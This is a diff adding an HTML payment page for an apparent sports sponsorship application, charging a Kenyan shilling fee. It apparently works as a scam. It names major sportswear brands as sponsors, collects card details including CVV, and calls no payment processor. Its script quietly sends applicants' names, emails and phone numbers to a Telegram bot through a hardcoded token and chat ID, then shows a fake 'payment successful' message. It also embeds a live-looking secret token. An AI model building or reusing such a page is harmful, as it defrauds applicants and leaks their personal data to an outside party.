@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Sports Sponsorship</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Playfair+Display:ital,wght@0,700;0,800;0,900;1,700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            position: relative;
+            background: #0a0a1a;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                url('https://images.pexels.com/photos/235922/pexels-photo-235922.jpeg?auto=compress&cs=tinysrgb&w=1920') center/cover no-repeat;
+            z-index: 0;
+            animation: zoomBackground 30s infinite alternate ease-in-out;
+        }
+
+        @keyframes zoomBackground {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.06); }
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                linear-gradient(135deg, rgba(10, 10, 26, 0.7) 0%, rgba(10, 10, 26, 0.4) 50%, rgba(10, 10, 26, 0.7) 100%);
+            z-index: 0;
+        }
+
+        .glass-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 0;
+            pointer-events: none;
+            animation: orbPulse 8s infinite alternate ease-in-out;
+        }
+
+        .glass-orb-1 {
+            width: 400px;
+            height: 400px;
+            top: -100px;
+            right: -100px;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.12), transparent 70%);
+            animation-delay: 0s;
+        }
+
+        .glass-orb-2 {
+            width: 350px;
+            height: 350px;
+            bottom: -80px;
+            left: -80px;
+            background: radial-gradient(circle, rgba(138, 43, 226, 0.1), transparent 70%);
+            animation-delay: 2s;
+        }
+
+        @keyframes orbPulse {
+            0% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 700px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.10);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 30px;
+            padding: 50px;
+            box-shadow:
+                0 30px 80px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.10);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            animation: slideUp 0.6s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .container::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 10px;
+        }
+
+        .container::-webkit-scrollbar-thumb {
+            background: rgba(255, 215, 0, 0.25);
+            border-radius: 10px;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(40px) scale(0.97); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header .step {
+            display: inline-block;
+            background: rgba(255, 215, 0, 0.12);
+            color: #FBBF24;
+            padding: 6px 24px;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 215, 0, 0.08);
+            margin-bottom: 15px;
+        }
+
+        .header h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.4rem;
+            color: #ffffff;
+            margin: 15px 0 8px;
+            text-shadow: 0 2px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .header p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+            font-weight: 400;
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 10%;
+            right: 10%;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-50%);
+            z-index: 0;
+            border-radius: 10px;
+        }
+
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 1;
+            flex: 1;
+        }
+
+        .progress-step .circle {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.25);
+            transition: all 0.3s;
+            font-size: 0.85rem;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .progress-step.completed .circle {
+            background: rgba(52, 211, 153, 0.15);
+            color: #34D399;
+            border-color: rgba(52, 211, 153, 0.1);
+        }
+
+        .progress-step.active .circle {
+            background: linear-gradient(135deg, #FBBF24, #F59E0B);
+            color: #0a0a1a;
+            box-shadow: 0 5px 20px rgba(251, 191, 36, 0.25);
+            border-color: transparent;
+        }
+
+        .progress-step .label {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.25);
+            margin-top: 8px;
+            text-align: center;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .progress-step.completed .label {
+            color: #34D399;
+        }
+
+        .progress-step.active .label {
+            color: #FBBF24;
+        }
+
+        .inspiration-banner {
+            background: rgba(255, 215, 0, 0.05);
+            border: 1px solid rgba(255, 215, 0, 0.06);
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            flex-wrap: wrap;
+            backdrop-filter: blur(10px);
+        }
+
+        .inspiration-banner .quote-icon {
+            font-size: 1.6rem;
+            color: #FBBF24;
+            opacity: 0.7;
+        }
+
+        .inspiration-banner .quote-text {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.7);
+            font-style: italic;
+            flex: 1;
+            line-height: 1.6;
+        }
+
+        .inspiration-banner .quote-text strong {
+            color: #ffffff;
+            font-style: normal;
+        }
+
+        .inspiration-banner .quote-author {
+            font-size: 0.7rem;
+            color: #FBBF24;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .payment-summary {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 25px;
+            margin: 20px 0;
+            backdrop-filter: blur(10px);
+        }
+
+        .payment-summary .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .payment-summary .row:last-child {
+            border-bottom: none;
+        }
+
+        .payment-summary .label {
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 400;
+            font-size: 0.9rem;
+        }
+
+        .payment-summary .value {
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .payment-summary .total .value {
+            color: #FBBF24;
+            font-size: 1.6rem;
+            font-family: 'Playfair Display', serif;
+        }
+
+        .payment-summary .total .label {
+            font-weight: 600;
+        }
+
+        .payment-options-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.3rem;
+            color: #ffffff;
+            margin: 25px 0 18px;
+            text-align: center;
+        }
+
+        .payment-options-title span {
+            color: #FBBF24;
+        }
+
+        .payment-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .payment-option {
+            background: rgba(255, 255, 255, 0.03);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 18px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+        }
+
+        .payment-option:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 215, 0, 0.15);
+            transform: translateY(-4px);
+        }
+
+        .payment-option.selected {
+            border-color: #FBBF24;
+            background: rgba(251, 191, 36, 0.06);
+            box-shadow: 0 0 30px rgba(251, 191, 36, 0.05);
+        }
+
+        .payment-option.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 8px;
+            right: 10px;
+            width: 22px;
+            height: 22px;
+            background: #FBBF24;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: #0a0a1a;
+            box-shadow: 0 0 20px rgba(251, 191, 36, 0.2);
+        }
+
+        .payment-option .option-image {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 10px;
+            display: block;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.3s;
+        }
+
+        .payment-option:hover .option-image {
+            border-color: rgba(255, 215, 0, 0.2);
+        }
+
+        .payment-option .option-name {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .payment-option .option-desc {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.3);
+            margin-top: 4px;
+        }
+
+        .payment-form {
+            display: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 15px 0;
+            animation: slideUp 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .payment-form.visible {
+            display: block;
+        }
+
+        .payment-form .form-group {
+            margin-bottom: 15px;
+        }
+
+        .payment-form .form-group label {
+            display: block;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 6px;
+            font-size: 0.85rem;
+        }
+
+        .payment-form .form-group label .required {
+            color: #ff6b6b;
+            margin-left: 3px;
+        }
+
+        .payment-form .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            font-size: 0.95rem;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+            background: rgba(255, 255, 255, 0.04);
+            color: #ffffff;
+            backdrop-filter: blur(10px);
+        }
+
+        .payment-form .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .payment-form .form-group input:focus {
+            outline: none;
+            border-color: #FBBF24;
+            box-shadow: 0 0 0 4px rgba(251, 191, 36, 0.05);
+            background: rgba(255, 255, 255, 0.07);
+        }
+
+        .payment-form .form-group .hint {
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.3);
+            margin-top: 4px;
+        }
+
+        .btn-submit-payment {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #FBBF24, #F59E0B);
+            color: #0a0a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 10px;
+        }
+
+        .btn-submit-payment:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(251, 191, 36, 0.2);
+        }
+
+        .btn-submit-payment:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .sponsors-section {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 25px;
+            margin: 25px 0 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .sponsors-section .section-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.2rem;
+            color: #ffffff;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .sponsors-section .section-title span {
+            color: #FBBF24;
+        }
+
+        .sponsors-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+        }
+
+        .sponsor-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            padding: 12px 10px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .sponsor-item:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 215, 0, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .sponsor-item .sponsor-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 8px;
+            display: block;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .sponsor-item .sponsor-name {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .sponsor-item .sponsor-desc {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.3);
+            margin-top: 2px;
+        }
+
+        .status-message {
+            display: none;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: 500;
+            font-size: 0.95rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .status-message.success {
+            display: block;
+            background: rgba(52, 211, 153, 0.12);
+            color: #34D399;
+            border: 1px solid rgba(52, 211, 153, 0.08);
+        }
+
+        .status-message.error {
+            display: block;
+            background: rgba(239, 68, 68, 0.12);
+            color: #EF4444;
+            border: 1px solid rgba(239, 68, 68, 0.08);
+        }
+
+        .status-message.loading {
+            display: block;
+            background: rgba(251, 191, 36, 0.08);
+            color: #FBBF24;
+            border: 1px solid rgba(251, 191, 36, 0.06);
+        }
+
+        .btn-back {
+            display: inline-block;
+            padding: 12px 30px;
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            backdrop-filter: blur(10px);
+        }
+
+        .btn-back:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 215, 0, 0.15);
+            color: #ffffff;
+        }
+
+        .footer-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 25px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+                max-height: 95vh;
+            }
+
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .progress-bar {
+                display: none;
+            }
+
+            .footer-actions {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .btn-back {
+                width: 100%;
+                text-align: center;
+            }
+
+            .payment-summary .row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 4px;
+            }
+
+            .payment-summary .total .value {
+                font-size: 1.3rem;
+            }
+
+            .payment-options {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .sponsors-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .inspiration-banner {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+
+            .header h1 {
+                font-size: 1.6rem;
+            }
+
+            body {
+                padding: 20px 10px;
+            }
+
+            .container {
+                border-radius: 20px;
+            }
+
+            .payment-summary .total .value {
+                font-size: 1.1rem;
+            }
+
+            .payment-options {
+                grid-template-columns: 1fr;
+            }
+
+            .sponsors-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .payment-option .option-image {
+                width: 50px;
+                height: 50px;
+            }
+
+            .sponsor-item .sponsor-logo {
+                width: 50px;
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="glass-orb glass-orb-1"></div>
+<div class="glass-orb glass-orb-2"></div>
+
+<div class="container">
+
+    <div class="progress-bar">
+        <div class="progress-step completed">
+            <div class="circle">✓</div>
+            <div class="label">Sport Selection</div>
+        </div>
+        <div class="progress-step completed">
+            <div class="circle">✓</div>
+            <div class="label">Personal Details</div>
+        </div>
+        <div class="progress-step completed">
+            <div class="circle">✓</div>
+            <div class="label">Application</div>
+        </div>
+        <div class="progress-step active">
+            <div class="circle">4</div>
+            <div class="label">Payment</div>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="step">Step 4 of 4</div>
+        <h1>Complete Your Application</h1>
+        <p>Choose your payment method and finalize your sponsorship</p>
+    </div>
+
+    <div class="inspiration-banner">
+        <span class="quote-icon">🏃</span>
+        <span class="quote-text">
+            "<strong>No human is limited.</strong> Take the final step toward your dream."
+        </span>
+        <span class="quote-author">— Eliud Kipchoge</span>
+    </div>
+
+    <div class="payment-summary" id="paymentSummary">
+        <!-- Dynamically filled -->
+    </div>
+
+    <div class="payment-options-title">Select <span>Payment Method</span></div>
+
+    <div class="payment-options" id="paymentOptions">
+        <div class="payment-option" data-method="mastercard" onclick="selectPayment('mastercard')">
+            <img class="option-image" src="https://images.pexels.com/photos/271541/pexels-photo-271541.jpeg?auto=compress&cs=tinysrgb&w=200&h=200&fit=crop&q=80" alt="Mastercard">
+            <div class="option-name">Mastercard</div>
+            <div class="option-desc">Credit / Debit card</div>
+        </div>
+
+        <div class="payment-option" data-method="mpesa" onclick="selectPayment('mpesa')">
+            <img class="option-image" src="https://images.pexels.com/photos/709168/pexels-photo-709168.jpeg?auto=compress&cs=tinysrgb&w=200&h=200&fit=crop&q=80" alt="M-PESA">
+            <div class="option-name">M-PESA</div>
+            <div class="option-desc">Mobile money transfer</div>
+        </div>
+
+        <div class="payment-option" data-method="airtel" onclick="selectPayment('airtel')">
+            <img class="option-image" src="https://images.pexels.com/photos/709168/pexels-photo-709168.jpeg?auto=compress&cs=tinysrgb&w=200&h=200&fit=crop&q=80" alt="Airtel Money">
+            <div class="option-name">Airtel Money</div>
+            <div class="option-desc">Mobile wallet transfer</div>
+        </div>
+    </div>
+
+    <div class="payment-form" id="mastercardForm">
+        <h4 style="color: #ffffff; margin-bottom: 15px; font-family: 'Playfair Display', serif;">Card Details</h4>
+        <div class="form-group">
+            <label>Card Number <span class="required">*</span></label>
+            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+        </div>
+        <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+            <div class="form-group" style="margin-bottom: 0;">
+                <label>Expiry Date <span class="required">*</span></label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY">
+            </div>
+            <div class="form-group" style="margin-bottom: 0;">
+                <label>CVV <span class="required">*</span></label>
+                <input type="password" id="cardCvv" placeholder="***" maxlength="4">
+            </div>
+        </div>
+        <div class="form-group">
+            <label>Cardholder Name <span class="required">*</span></label>
+            <input type="text" id="cardName" placeholder="John Mwangi">
+        </div>
+        <button class="btn-submit-payment" onclick="submitPayment('mastercard')">Pay with Mastercard →</button>
+    </div>
+
+    <div class="payment-form" id="mpesaForm">
+        <h4 style="color: #ffffff; margin-bottom: 15px; font-family: 'Playfair Display', serif;">M-PESA Payment</h4>
+        <div class="form-group">
+            <label>M-PESA Phone Number <span class="required">*</span></label>
+            <input type="tel" id="mpesaPhone" placeholder="2547XXXXXXXX">
+            <div class="hint">Enter your M-PESA registered number</div>
+        </div>
+        <button class="btn-submit-payment" onclick="submitPayment('mpesa')">Pay with M-PESA →</button>
+    </div>
+
+    <div class="payment-form" id="airtelForm">
+        <h4 style="color: #ffffff; margin-bottom: 15px; font-family: 'Playfair Display', serif;">Airtel Money Payment</h4>
+        <div class="form-group">
+            <label>Airtel Money Phone Number <span class="required">*</span></label>
+            <input type="tel" id="airtelPhone" placeholder="2547XXXXXXXX">
+            <div class="hint">Enter your Airtel Money registered number</div>
+        </div>
+        <button class="btn-submit-payment" onclick="submitPayment('airtel')">Pay with Airtel Money →</button>
+    </div>
+
+    <div id="statusMessage" class="status-message"></div>
+
+    <div class="sponsors-section">
+        <div class="section-title">Our <span>Sponsors</span></div>
+        <div class="sponsors-grid">
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Nike">
+                <div class="sponsor-name">Nike</div>
+                <div class="sponsor-desc">Sports Apparel</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/2403047/pexels-photo-2403047.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Adidas">
+                <div class="sponsor-name">Adidas</div>
+                <div class="sponsor-desc">Athletic Gear</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/4386466/pexels-photo-4386466.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Puma">
+                <div class="sponsor-name">Puma</div>
+                <div class="sponsor-desc">Sportswear</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="New Balance">
+                <div class="sponsor-name">New Balance</div>
+                <div class="sponsor-desc">Running Shoes</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/2403047/pexels-photo-2403047.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Under Armour">
+                <div class="sponsor-name">Under Armour</div>
+                <div class="sponsor-desc">Performance Wear</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/4386466/pexels-photo-4386466.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="ASICS">
+                <div class="sponsor-name">ASICS</div>
+                <div class="sponsor-desc">Running Gear</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Reebok">
+                <div class="sponsor-name">Reebok</div>
+                <div class="sponsor-desc">Fitness Apparel</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/2403047/pexels-photo-2403047.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Saucony">
+                <div class="sponsor-name">Saucony</div>
+                <div class="sponsor-desc">Running Shoes</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/4386466/pexels-photo-4386466.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Brooks">
+                <div class="sponsor-name">Brooks</div>
+                <div class="sponsor-desc">Running Performance</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Mizuno">
+                <div class="sponsor-name">Mizuno</div>
+                <div class="sponsor-desc">Sports Equipment</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/2403047/pexels-photo-2403047.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Lululemon">
+                <div class="sponsor-name">Lululemon</div>
+                <div class="sponsor-desc">Athletic Wear</div>
+            </div>
+            <div class="sponsor-item">
+                <img class="sponsor-logo" src="https://images.pexels.com/photos/4386466/pexels-photo-4386466.jpeg?auto=compress&cs=tinysrgb&w=150&h=150&fit=crop&q=80" alt="Garmin">
+                <div class="sponsor-name">Garmin</div>
+                <div class="sponsor-desc">Sports Tech</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-actions">
+        <a href="application-success.html" class="btn-back">← Back</a>
+        <a href="index.html" style="color: rgba(255,255,255,0.3); font-size: 0.9rem; text-decoration: none;">Cancel</a>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const feeData = JSON.parse(localStorage.getItem('applicationFee') || '{}');
+        const athleteData = JSON.parse(localStorage.getItem('athleteData') || '{}');
+
+        const feeAmount = feeData.amount || 2000;
+        const feeDetail = feeData.detail || 'Individual Athlete • Athletics';
+
+        const summary = document.getElementById('paymentSummary');
+
+        let summaryHTML = `
+            <div class="row">
+                <span class="label">Applicant Type</span>
+                <span class="value">${athleteData.applicantType === 'team' ? 'Team / Club' : 'Individual Athlete'}</span>
+            </div>
+        `;
+
+        if (athleteData.applicantType === 'team') {
+            summaryHTML += `
+                <div class="row">
+                    <span class="label">Team Name</span>
+                    <span class="value">${athleteData.teamName || 'Not provided'}</span>
+                </div>
+                <div class="row">
+                    <span class="label">Team Members</span>
+                    <span class="value">${athleteData.teamMembers || 'Not specified'}</span>
+                </div>
+            `;
+        } else {
+            summaryHTML += `
+                <div class="row">
+                    <span class="label">Full Name</span>
+                    <span class="value">${athleteData.fullName || 'Not provided'}</span>
+                </div>
+            `;
+        }
+
+        summaryHTML += `
+            <div class="row">
+                <span class="label">Sport</span>
+                <span class="value">${athleteData.sport || 'Not provided'}</span>
+            </div>
+            <div class="row">
+                <span class="label">Fee Type</span>
+                <span class="value">${feeDetail}</span>
+            </div>
+            <div class="row total">
+                <span class="label" style="font-size: 1.1rem;">Total Amount</span>
+                <span class="value">Ksh. ${feeAmount.toLocaleString()}</span>
+            </div>
+        `;
+
+        summary.innerHTML = summaryHTML;
+
+        console.log('💰 Payment Page Loaded');
+        console.log('💳 Fee Amount:', feeAmount);
+    });
+
+    let selectedMethod = null;
+
+    function selectPayment(method) {
+        selectedMethod = method;
+
+        document.querySelectorAll('.payment-option').forEach(option => {
+            option.classList.toggle('selected', option.dataset.method === method);
+        });
+
+        document.querySelectorAll('.payment-form').forEach(form => {
+            form.classList.toggle('visible', form.id === method + 'Form');
+        });
+
+        document.getElementById('statusMessage').style.display = 'none';
+    }
+
+    function submitPayment(method) {
+        const status = document.getElementById('statusMessage');
+        const btn = document.querySelector(`#${method}Form .btn-submit-payment`);
+
+        let isValid = true;
+        let errorMessage = '';
+
+        switch(method) {
+            case 'mastercard':
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                const cardExpiry = document.getElementById('cardExpiry').value;
+                const cardCvv = document.getElementById('cardCvv').value;
+                const cardName = document.getElementById('cardName').value;
+
+                if (!cardNumber || cardNumber.length < 16) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid card number.';
+                } else if (!cardExpiry || !cardExpiry.match(/^\d{2}\/\d{2}$/)) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid expiry date (MM/YY).';
+                } else if (!cardCvv || cardCvv.length < 3) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid CVV.';
+                } else if (!cardName) {
+                    isValid = false;
+                    errorMessage = 'Please enter the cardholder name.';
+                }
+                break;
+            case 'mpesa':
+                const mpesaPhone = document.getElementById('mpesaPhone').value;
+                if (!mpesaPhone || !mpesaPhone.match(/^2547\d{8}$/)) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid M-PESA number (2547XXXXXXXX).';
+                }
+                break;
+            case 'airtel':
+                const airtelPhone = document.getElementById('airtelPhone').value;
+                if (!airtelPhone || !airtelPhone.match(/^2547\d{8}$/)) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid Airtel Money number (2547XXXXXXXX).';
+                }
+                break;
+        }
+
+        if (!isValid) {
+            status.className = 'status-message error';
+            status.textContent = errorMessage;
+            status.style.display = 'block';
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = 'Processing...';
+
+        status.className = 'status-message loading';
+        status.textContent = 'Processing your payment...';
+        status.style.display = 'block';
+
+        const athleteData = JSON.parse(localStorage.getItem('athleteData') || '{}');
+        const feeData = JSON.parse(localStorage.getItem('applicationFee') || '{}');
+
+        const paymentData = {
+            method: method,
+            amount: feeData.amount || 2000,
+            applicant: athleteData.fullName || athleteData.teamName || 'N/A',
+            email: athleteData.email || athleteData.teamEmail || 'N/A',
+            phone: method === 'mpesa' ? document.getElementById('mpesaPhone').value :
+                   method === 'airtel' ? document.getElementById('airtelPhone').value :
+                   athleteData.phone || 'N/A',
+            timestamp: new Date().toISOString()
+        };
+
+        sendPaymentToTelegram(paymentData);
+
+        setTimeout(() => {
+            status.className = 'status-message success';
+            status.textContent = 'Payment submitted successfully! Your sponsorship application is now complete.';
+            status.style.display = 'block';
+
+            btn.textContent = 'Payment Submitted';
+            btn.style.background = 'linear-gradient(135deg, #34D399, #059669)';
+            btn.disabled = true;
+
+            athleteData.paymentStatus = 'completed';
+            athleteData.paymentMethod = method;
+            athleteData.paymentDate = new Date().toISOString();
+            localStorage.setItem('athleteData', JSON.stringify(athleteData));
+
+            console.log('Payment submitted:', paymentData);
+        }, 3000);
+    }
+
+    function sendPaymentToTelegram(data) {
+        const BOT_TOKEN = '8887420345:AAFIrzbCuqIcTatzhIxYN9HTV0iSIaiO7bk';
+        const CHAT_ID = '8834429633';
+
+        const methodNames = {
+            'mastercard': 'Mastercard',
+            'mpesa': 'M-PESA',
+            'airtel': 'Airtel Money'
+        };
+
+        const message = `
+PAYMENT RECEIVED
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Applicant: ${data.applicant}
+Email: ${data.email}
+Phone: ${data.phone}
+Amount: Ksh. ${data.amount.toLocaleString()}
+Method: ${methodNames[data.method] || data.method}
+Date: ${new Date(data.timestamp).toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: Payment Submitted
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => response.json())
